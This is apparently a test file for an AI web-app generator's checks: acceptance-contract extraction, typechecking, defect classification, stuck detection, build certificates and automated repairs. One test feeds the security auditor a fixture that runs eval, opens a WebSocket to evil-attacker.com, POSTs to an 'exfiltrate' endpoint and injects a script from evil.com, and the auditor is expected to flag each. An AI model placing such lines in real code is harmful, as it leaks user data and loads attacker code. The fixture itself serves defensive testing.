import {createHash} from 'node:crypto';
import test from 'node:test';
import assert from 'node:assert/strict';
import { extractAcceptanceContract, validateAcceptanceCompliance } from '../src/lib/server/generator/acceptanceContract';
import { typecheckGeneratorSource } from '../src/lib/server/generator/typescriptTypecheck';
import { auditGeneratorSecurity } from '../src/lib/server/generator/securityAuditor';
import { classifyDefect } from '../src/lib/server/generator/defectClassifier';
import { StuckDetector, normalizeErrorSignature } from '../src/lib/server/generator/stuckDetector';
import { createBuildEvidenceManifest, issueVerifiedBuildCertificate } from '../src/lib/server/generator/evidenceCertificate';
import { createGeneratorSnapshot } from '../src/lib/server/generator/versionedEdits';
import { applyKnownWorkbenchCompilerRepair } from '../src/lib/server/generator/workbenchCompilerRepair';
import { applyKnownWorkbenchResponsiveRepair } from '../src/lib/server/generator/workbenchResponsiveRepair';
import type { GeneratorIdentity } from '../src/lib/server/generator/contract';

const dummyIdentityA: GeneratorIdentity = {
  ownerId: 'user-alpha-123456',
  projectId: 'v2-project-alpha-123456',
  missionId: 'v2-app-alpha-123456',
  environmentId: 'v2-env-alpha-123456',
};

const dummyIdentityB: GeneratorIdentity = {
  ownerId: 'user-beta-789012',
  projectId: 'v2-project-beta-789012',
  missionId: 'v2-app-beta-789012',
  environmentId: 'v2-env-beta-789012',
};

test('Golden Mission 01 — Calculator: extracts mandatory math logic requirement', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Simulador Financeiro e Calculadora',
    brief: 'Crie uma calculadora financeira para simular parcelamento e calcular juros compostos.',
  });

  const mathReq = contract.requirements.find(r => r.id === 'feature.calculation-logic');
  assert.ok(mathReq, 'Calculation requirement must be extracted');
  assert.equal(mathReq.priority, 'mandatory');
  assert.equal(mathReq.immutable, true);
});

test('Golden Mission 02 — Todo/list app: extracts mandatory persistence requirement', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Task Manager Pro',
    brief: 'Gerenciador de tarefas com filtros. As tarefas devem ser salvas no localStorage e persistir após reload.',
  });

  const persistenceReq = contract.requirements.find(r => r.id === 'feature.local-persistence');
  assert.ok(persistenceReq, 'Persistence requirement must be extracted');
  assert.equal(persistenceReq.priority, 'mandatory');
});

test('Golden Mission 03 — Responsive dashboard: extracts responsive layout baseline requirement', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Analytics KPI Dashboard',
    brief: 'Dashboard corporativo com gráficos e cartões de métricas responsivos.',
  });

  const responsiveReq = contract.requirements.find(r => r.id === 'platform.responsive-layout');
  assert.ok(responsiveReq, 'Responsive baseline requirement must exist');
  assert.equal(responsiveReq.priority, 'mandatory');
});

test('Golden Mission 04 — Ecommerce cart: extracts mandatory cart management requirement', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Loja de Hardware',
    brief: 'E-commerce completo. O usuário deve conseguir adicionar itens ao carrinho e ver o total.',
  });

  const cartReq = contract.requirements.find(r => r.id === 'feature.cart-management');
  assert.ok(cartReq, 'Cart management requirement must be extracted');
  assert.equal(cartReq.priority, 'mandatory');
});

test('Golden Mission 05 — Modal and form: extracts mandatory data entry requirement', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Cadastro de Clientes',
    brief: 'Sistema para cadastrar clientes através de um formulário em modal com validações.',
  });

  const formReq = contract.requirements.find(r => r.id === 'feature.data-entry');
  assert.ok(formReq, 'Data entry requirement must be extracted');
  assert.equal(formReq.priority, 'mandatory');
});

test('Golden Mission 06 — Purposely broken app: fails semantic TypeScript typecheck', () => {
  const brokenSource = [
    {
      path: 'src/App.tsx' as const,
      content: `
        import React from 'react';
        export default function App() {
          const count: number = "this is a string, not a number";
          const nonExistentMethod = count.fooBarBaz();
          return <div>{count}</div>;
        }
      `,
    },
  ];

  const report = typecheckGeneratorSource(brokenSource);
  assert.equal(report.status, 'failed', 'Broken TypeScript code must fail typecheck');
  assert.ok(report.totalErrors >= 1, 'At least 1 typecheck error must be reported');
  assert.ok(report.diagnostics.some(d => d.message.includes('not assignable')), 'Type mismatch diagnosed');
});

test('Golden Mission 07 — Mobile overflow: defect classifier classifies as APPLICATION_DEFECT', () => {
  const defect = classifyDefect({
    failureMessage: 'Checks failed. journey:390:1: Horizontal overflow after interaction. document.documentElement.scrollWidth > innerWidth + 2',
    sourceCode: '<div className="wide-table"><table>...</table></div>',
    cssCode: '.wide-table { width: 600px; }',
  });

  assert.equal(defect.classification, 'APPLICATION_DEFECT');
  assert.equal(defect.sourceTarget, 'src/styles.css');
  assert.ok(defect.reason.includes('overflow'));
});

test('Golden Mission 08 — Missing mandatory requirement: compliance check fails closed', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Loja com Carrinho',
    brief: 'Adicionar produto ao carrinho e ver itens no carrinho.',
  });

  // Simulator where cart check is missing
  const checkResults = new Map<string, { passed: boolean; details: string }>([
    ['platform.clean-startup', { passed: true, details: 'OK' }],
    ['platform.typescript-typecheck', { passed: true, details: 'OK' }],
    ['platform.responsive-layout', { passed: true, details: 'OK' }],
    ['security.secrets-isolation', { passed: true, details: 'OK' }],
    ['security.safe-execution', { passed: true, details: 'OK' }],
    // 'feature.cart-management' is omitted!
  ]);

  const compliance = validateAcceptanceCompliance(contract, checkResults);
  assert.equal(compliance.compliant, false, 'Compliance must fail when mandatory requirement is missing');
  assert.ok(compliance.mandatoryFailures.some(f => f.requirement.id === 'feature.cart-management'));
});

test('Golden Mission 09 — Cross-mission contamination prevention: isolated scopes and artifacts', () => {
  const snapshotA = createGeneratorSnapshot({
    scope: dummyIdentityA,
    revision: 'build-1',
    files: [
      { path: 'src/App.tsx', content: 'export default function App() { return <h1>Mission A</h1>; }' },
      { path: 'src/styles.css', content: 'body { color: blue; }' },
    ],
  });

  const snapshotB = createGeneratorSnapshot({
    scope: dummyIdentityB,
    revision: 'build-1',
    files: [
      { path: 'src/App.tsx', content: 'export default function App() { return <h1>Mission B</h1>; }' },
      { path: 'src/styles.css', content: 'body { color: green; }' },
    ],
  });

  // Verify identity scopes do not match
  assert.notEqual(snapshotA.scope.missionId, snapshotB.scope.missionId);
  assert.notEqual(snapshotA.scope.ownerId, snapshotB.scope.ownerId);
  assert.notEqual(snapshotA.hash, snapshotB.hash);

  // Evidence manifest for Mission B cannot claim Mission A
  const contractB = extractAcceptanceContract({
    identity: dummyIdentityB,
    title: 'Mission B',
    brief: 'Aplicação B isolada.',
  });

  const manifestB = createBuildEvidenceManifest({
    identity: {
      missionId: dummyIdentityB.missionId,
      runId: 'run-b',
      workspaceId: dummyIdentityB.projectId,
      artifactId: `art-${snapshotB.hash.slice(0, 16)}`,
      artifactVersion: 'build-1',
      buildId: 'build-b',
      sandboxId: 'sandbox-b',
      qaRunId: 'qa-b',
    },
    sourceHash: snapshotB.hash,
    bundleHash: createHash('sha256').update(JSON.stringify([{path:'index.html',content:'<html></html>'}])).digest('hex'),
    generatorVersion: 'devkiller-v2.1',
    environmentVersion: 'react-workbench-v2',
    acceptanceContract: contractB,
    verification: {
      status: 'passed',
      sourceHash: snapshotB.hash,
      verifierVersion: 'react-workbench-v2',
      compiledFiles: [{path:'index.html',content:'<html></html>'}],
      checks: [
        { id: 'platform:typescript-typecheck', passed: true, details: 'OK' },
        { id: 'platform:startup', passed: true, details: 'OK' },
        { id: 'platform:responsive-layout', passed: true, details: 'OK' },
      ],
      failures: [],
      limitations: [],
      durationMs: 100,
    },
  });

  assert.equal(manifestB.identity.missionId, dummyIdentityB.missionId);
  assert.notEqual(manifestB.sourceHash, snapshotA.hash);
});

test('Golden Mission 10 — Forbidden external API / WebSocket / eval: blocked by security auditor', () => {
  const maliciousSource = [
    {
      path: 'src/App.tsx' as const,
      content: `
        import React, { useEffect } from 'react';
        export default function App() {
          useEffect(() => {
            eval("window.__secret = 123");
            const ws = new WebSocket("wss://evil-attacker.com/telemetry");
            fetch("https://external-api.com/exfiltrate", { method: "POST" });
            const s = document.createElement("script");
            s.src = "https://evil.com/hack.js";
            document.body.appendChild(s);
          }, []);
          return <div>Safe App</div>;
        }
      `,
    },
  ];

  const audit = auditGeneratorSecurity(maliciousSource);
  assert.equal(audit.passed, false, 'Malicious patterns must fail security audit');
  assert.ok(audit.violations.some(v => v.ruleId === 'sec.eval-injection'), 'Eval detected');
  assert.ok(audit.violations.some(v => v.ruleId === 'sec.raw-websocket'), 'WebSocket detected');
  assert.ok(audit.violations.some(v => v.ruleId === 'sec.script-tag-injection'), 'Dynamic script tag detected');
  assert.ok(audit.violations.some(v => v.ruleId === 'sec.direct-external-fetch'), 'Direct external fetch detected');
});

test('Stuck Detector — detects repeated error signature and halts loop', () => {
  const detector = new StuckDetector();
  const errorMsg = 'Horizontal overflow after interaction at 390px';
  const sig = normalizeErrorSignature(errorMsg);

  const attempt1 = detector.recordAttempt({
    errorSignature: sig,
    filesChanged: ['src/styles.css'],
    diffHash: 'diff-hash-1',
    testPassedCount: 5,
    testFailedCount: 1,
    failedCheckIds: ['platform:responsive-layout'],
  });
  assert.equal(attempt1.stuck, false, 'First attempt is not stuck');

  const attempt2 = detector.recordAttempt({
    errorSignature: sig,
    filesChanged: ['src/styles.css'],
    diffHash: 'diff-hash-2',
    testPassedCount: 5,
    testFailedCount: 1,
    failedCheckIds: ['platform:responsive-layout'],
  });
  assert.equal(attempt2.stuck, true, 'Second consecutive same-signature attempt is declared STUCK');
  assert.equal(attempt2.reason, 'same_error_signature');
});

test('Verified Build Certificate — issues certificate only when 100% verified', () => {
  const contract = extractAcceptanceContract({
    identity: dummyIdentityA,
    title: 'Certified App',
    brief: 'App verificado sem pendências.',
  });

  const manifest = createBuildEvidenceManifest({
    identity: {
      missionId: dummyIdentityA.missionId,
      runId: 'run-1',
      workspaceId: dummyIdentityA.projectId,
      artifactId: 'art-1',
      artifactVersion: 'build-1',
      buildId: 'b-1',
      sandboxId: 's-1',
      qaRunId: 'qa-1',
    },
    sourceHash: 'sha256-src-123456',
    bundleHash: createHash('sha256').update(JSON.stringify([{path:'index.html',content:'<html></html>'}])).digest('hex'),
    generatorVersion: 'devkiller-v2.1',
    environmentVersion: 'react-workbench-v2',
    acceptanceContract: contract,
    verification: {
      status: 'passed',
      sourceHash: 'sha256-src-123456',
      verifierVersion: 'react-workbench-v2',
      compiledFiles: [{path:'index.html',content:'<html></html>'}],
      checks: contract.requirements.map(req=>({id:'requirement:'+req.id,passed:true,details:'Executed requirement-specific fixture'})),
      failures: [],
      limitations: [],
      durationMs: 80,
    },
  });

  const cert = issueVerifiedBuildCertificate(manifest);
  assert.equal(cert.verificationPassed, true);
  assert.ok(cert.certificateId.startsWith('evidence-dk-'));
  assert.equal(cert.attestation, 'unsigned-integrity-manifest');
});

test('Golden Mission 11 — useRef null safety mechanical repair', () => {
  const code = `import React, { useRef } from 'react';
export default function App() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  function render(el: HTMLCanvasElement) {}
  render(canvasRef.current);
  return <canvas ref={canvasRef} />;
}`;

  const snap = createGeneratorSnapshot({
    scope: dummyIdentityA,
    revision: 'build-1',
    files: [
      { path: 'src/App.tsx', content: code },
      { path: 'src/styles.css', content: 'body{}' },
    ],
  });

  const dummyReport: any = {
    checks: [
      {
        id: 'platform:typescript-typecheck',
        passed: false,
        details: "src/App.tsx:5:10 TS2345: Argument of type 'null' is not assignable to parameter of type 'HTMLCanvasElement'.",
      },
    ],
    failures: ["platform:typescript-typecheck: failed"],
  };

  const repair = applyKnownWorkbenchCompilerRepair(snap, dummyReport, 'repair-1');
  assert.equal(repair, null, 'Nullability needs a real control-flow fix; a non-null assertion cannot conceal it.');
});

test('Golden Mission 12 — Missing React namespace import repair', () => {
  const code = `import { useState } from 'react';
export default function App() {
  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {}
  return <input onChange={handleChange} />;
}`;

  const snap = createGeneratorSnapshot({
    scope: dummyIdentityA,
    revision: 'build-1',
    files: [
      { path: 'src/App.tsx', content: code },
      { path: 'src/styles.css', content: 'body{}' },
    ],
  });

  const dummyReport: any = {
    checks: [
      {
        id: 'platform:typescript-typecheck',
        passed: false,
        details: "src/App.tsx:3:28 TS2503: Cannot find namespace 'React'.",
      },
    ],
    failures: ["platform:typescript-typecheck: failed"],
  };

  const repair = applyKnownWorkbenchCompilerRepair(snap, dummyReport, 'repair-1');
  assert.ok(repair !== null);
  assert.equal(repair.kind, 'missing-react-namespace-import');
  const repairedFile = repair.snapshot.files.find(f => f.path === 'src/App.tsx');
  assert.ok(repairedFile?.content.includes('import React, { useState } from \'react\';'));
});

test('Golden Mission 13 — Unresponsive grid-cols collapse repair', () => {
  const code = `export default function App() {
  return (
    <div className="container mx-auto">
      <div className="grid grid-cols-3 gap-4">
        <div>Item 1</div>
        <div>Item 2</div>
        <div>Item 3</div>
      </div>
    </div>
  );
}`;

  const snap = createGeneratorSnapshot({
    scope: dummyIdentityA,
    revision: 'build-1',
    files: [
      { path: 'src/App.tsx', content: code },
      { path: 'src/styles.css', content: 'body{}' },
    ],
  });

  const dummyReport: any = {
    checks: [],
    failures: ['Checks failed. Horizontal overflow after interaction.'],
  };

  const repair = applyKnownWorkbenchResponsiveRepair(snap, dummyReport, 'repair-1');
  assert.ok(repair !== null);
  assert.equal(repair.kind, 'mobile-unresponsive-grid-collapse');
  const repairedFile = repair.snapshot.files.find(f => f.path === 'src/App.tsx');
  assert.ok(repairedFile?.content.includes('grid-cols-1 sm:grid-cols-3'));
});
